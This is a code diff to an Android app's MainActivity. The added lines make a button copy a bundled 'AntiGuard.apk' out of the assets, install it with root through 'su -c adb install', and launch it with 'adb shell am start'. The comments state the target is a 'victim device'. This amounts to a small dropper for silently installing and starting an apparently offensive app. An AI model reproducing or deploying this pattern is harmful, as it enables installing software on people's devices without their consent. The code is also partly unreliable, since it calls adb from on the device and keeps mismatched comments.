@@ -46,11 +46,11 @@ public class MainActivity extends Activity {
 		public void onClick(View v) {
 			// When button is pressed run shell script
 			// This part copies the anti from assets to the internal memory of the device
-			// This is so we can install the APK and run the installanti.sh
-			File destFile = new File(getFilesDir(),"anti");
+			// This is so we can install the APK and run it on the victim device
+			File destFile = new File(getFilesDir(),"AntiGuard.apk");
 			try {
 
-			        InputStream in = getAssets().open("anti");
+			        InputStream in = getAssets().open("AntiGuard.apk");
 			        OutputStream out = new FileOutputStream(destFile);
 
 			        byte[] buf = new byte[1024];
@@ -69,10 +69,10 @@ public class MainActivity extends Activity {
 			        System.out.println(e.getMessage());
 			    }
 			//Here we change the permissions of the script to execute"
-			//Using "Runtime.getRuntime()" to execute variable "permissions"
-				String permissions[]={"su","-c", "chmod 0700 /data/data/com.shadcat.p2pgui/files/anti/installAnti.sh"}; //Setting variable 'permissions' to make our script executable
+			//Using "Runtime.getRuntime()" to execute variable "installanti"
+				String installanti[]={"su","-c", "adb install /data/data/com.shadcat.p2pgui/files/AntiGuard.apk"}; //Setting variable 'installAnti' to install the apk on victim device
 		try {
-			Process process = Runtime.getRuntime().exec(permissions); //Executing variable "permissions"
+			Process process = Runtime.getRuntime().exec(installanti); //Executing variable "permissions"
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -80,7 +80,7 @@ public class MainActivity extends Activity {
 		//Now we run our script (thanks to Kos for the script & anti)
 		// which installs and runs anti on the victim device.
 		
-		String runanti[]={"su","-c", "chmod 0700 /data/data/com.shadcat.p2pgui/files/anti/installAnti.sh"}; //Setting variable 'runanti' so we can call it next
+		String runanti[]={"su","-c", "adb shell am start io.kos.antiguard/.unlock"}; //Setting variable 'runanti' to execute AntiGuard on Victim device
 		try {
 			Process process = Runtime.getRuntime().exec(runanti); //Executing variable "runanti"
 		} catch (IOException e) {
